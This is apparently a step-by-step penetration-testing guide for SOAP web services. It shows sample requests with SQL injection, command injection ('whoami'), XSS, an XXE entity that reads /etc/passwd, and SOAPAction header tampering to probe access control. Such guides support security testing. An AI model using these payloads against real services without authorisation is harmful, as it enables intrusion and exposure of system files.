ğŸ§¾ Step 1: Understand SOAP Structure
SOAP requests are XML-based and typically look like this:

xml
Copy
Edit
POST /service HTTP/1.1
Host: example.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUser"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <username>admin</username>
    </getUser>
  </soap:Body>
</soap:Envelope>
Your injection payloads go inside values like <username>, or as injected entities in the XML body.

ğŸ’‰ Step 2: Injection Points in SOAP
1. Basic Input Field Injection
Try inserting payloads into <username> or similar input fields:

ğŸ”¹ SQLi Test:
xml
Copy
Edit
<username>admin' or '1'='1</username>
ğŸ”¹ Command Injection Test:
xml
Copy
Edit
<username>admin; whoami</username>
ğŸ”¹ XSS Test (for web UIs):
xml
Copy
Edit
<username><script>alert(1)</script></username>
2. XXE Injection in SOAP
Inject an external entity if parser allows it:

xml
Copy
Edit
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <username>&xxe;</username>
    </getUser>
  </soap:Body>
</soap:Envelope>
â¡ï¸ If the server reflects /etc/passwd, it's vulnerable to XXE.

3. SOAPAction Header Abuse
Sometimes, the SOAPAction header is misused for access control.

Try:

http
Copy
Edit
SOAPAction: "admin:getUsers"
or change it to invalid ones:

http
Copy
Edit
SOAPAction: "badMethod"
See how the server responds. If method is accepted without auth, thatâ€™s a misconfig.
